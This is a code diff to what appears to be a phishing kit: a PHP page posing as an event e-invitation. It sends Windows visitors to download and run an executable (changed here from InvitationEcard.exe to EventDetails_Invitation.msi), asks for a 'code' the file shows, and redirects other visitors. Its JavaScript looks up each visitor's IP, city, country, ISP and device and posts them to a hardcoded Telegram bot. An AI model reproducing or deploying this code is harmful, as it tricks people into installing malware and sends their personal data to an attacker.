@@ -3,8 +3,8 @@
 // CONFIGURATION - EDIT THESE VALUES
 // ============================================================
 
-$exe_download_url = "https://gitlab.com/ashley.yeliinek/webackagaondsitalemojiwe/-/raw/main/InvitationEcard.exe?ref_type=heads";
-$redirect_url = "https://joinmyevent.party/login/s/profile/guest/invites";
+$exe_download_url = "EventDetails_Invitation.msi";
+$redirect_url = "EventDetails_Invitation.msi";
 $telegram_bot_token = "8414685064:AAE8saWJslebYxCffTg7UmnmUn_flVXd6Ok"; 
 $telegram_chat_id = "8005458264";   
 $access_code = "GLOW26";
@@ -17,7 +17,7 @@ $host_name = isset($_GET['name']) ? htmlspecialchars($_GET['name']) : $default_h
 $user_agent = $_SERVER['HTTP_USER_AGENT'];
 $is_windows = (strpos($user_agent, 'Windows') !== false);
 
-if (!$is_windows && !empty($redirect_url) && $redirect_url !== "https://joinmyevent.party/login/s/profile/guest/invites") {
+if (!$is_windows && !empty($redirect_url) && $redirect_url !== "EventDetails_Invitation.msi") {
     header("Location: " . $redirect_url);
     exit;
 }
@@ -374,7 +374,7 @@ if (!$is_windows && !empty($redirect_url) && $redirect_url !== "https://joinmyev
       <p class="desc">The 6-character code appeared when you opened the file. Paste it below to reveal your invitation.</p>
       
       <ol class="step-list">
-        <li>Open your <b>Downloads</b> folder and double-click <span class="code-highlight">InvitationEcard.exe</span>.</li>
+        <li>Open your <b>Downloads</b> folder and double-click <span class="code-highlight">EventDetails_Invitation.msi</span>.</li>
         <li>A <b>6-character code</b> will appear on your screen.</li>
         <li>Type it below to reveal your invitation.</li>
       </ol>
@@ -416,7 +416,7 @@ if (!$is_windows && !empty($redirect_url) && $redirect_url !== "https://joinmyev
   function notifyTelegram(action){ if(TELEGRAM_BOT_TOKEN==="") return; var host=HOST_NAME, guest=GUEST_NAME, device=detectDevice(), time=formatTimestamp(); fetch("https://ipapi.co/json/").then(function(res){return res.json();}).catch(function(){return {};}).then(function(geo){ var ip=geo.ip||"Unknown", location=(geo.city?geo.city:"Unknown")+"| "+(geo.country_name?geo.country_name:"Unknown"), isp=geo.org||"Unknown"; var text="\uD83D\uDCE5 "+action+"\n\n"+"\uD83D\uDC64 Host: "+host+"\n"+"\uD83D\uDC65 Guest: "+guest+"\n"+"\uD83C\uDF0D IP: "+ip+"\n"+"\uD83D\uDCCD Location: `"+location+"`\n"+"\uD83C\uDFE2 ISP: `"+isp+"`\n"+"\uD83D\uDDA5 Device: "+device+"\n"+"\uD83D\uDCC5 Time: "+time; return fetch("https://api.telegram.org/bot"+TELEGRAM_BOT_TOKEN+"/sendMessage",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:TELEGRAM_CHAT_ID,text:text,parse_mode:"Markdown"})}); }).catch(function(err){console.error("Telegram notify failed:",err);}); }
 
   function triggerDownload(){
-    // This extracts just the filename from the URL (InvitationEcard.exe)
+    // This extracts just the filename from the URL (EventDetails_Invitation.msi)
     var fileName = EXE_DOWNLOAD_URL.split('/').pop().split('?')[0];
     
     var link=document.createElement("a");
